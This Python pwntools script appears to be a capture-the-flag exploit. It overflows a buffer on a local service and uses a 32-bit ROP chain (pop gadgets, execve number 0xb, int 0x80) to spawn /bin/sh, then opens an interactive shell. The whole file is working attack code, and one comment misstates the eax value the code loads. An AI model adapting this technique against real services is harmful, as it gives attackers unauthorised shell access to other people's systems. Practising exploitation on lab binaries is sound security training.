#!/usr/bin/env python
from pwn import *

# prepare padding and /bin/sh
bin = 0x6e69622f
sh = 0x68732f
padding = "A"*91 + p32(bin) + p32(sh)

# make rop chain

pop_a = 0x8059909
pop_bd = 0x806eb09
pop_c = 0x80de2f9
sh_addr = 0xf6ffee64    # /bin/sh address
syscall = 0x806c775     # int 0x80

# pop eax ==> eax = 0x32 pop edx, pop ecx, pop ebx == > edx = 0, ecx = 0, ebx = sh_addr
rop_chain = p32(pop_bd) + p32(sh_addr) + p32(0)
rop_chain += p32(pop_a) + p32(0xb)
rop_chain += p32(pop_c) + p32(0)
# int 0x80
rop_chain += p32(syscall)

payload = padding + rop_chain

# run test on qira
r = remote("0.0.0.0", 4000)
# send payload
r.sendline(payload)
# change to interactive mode
r.interactive()
# close connection
r.close()
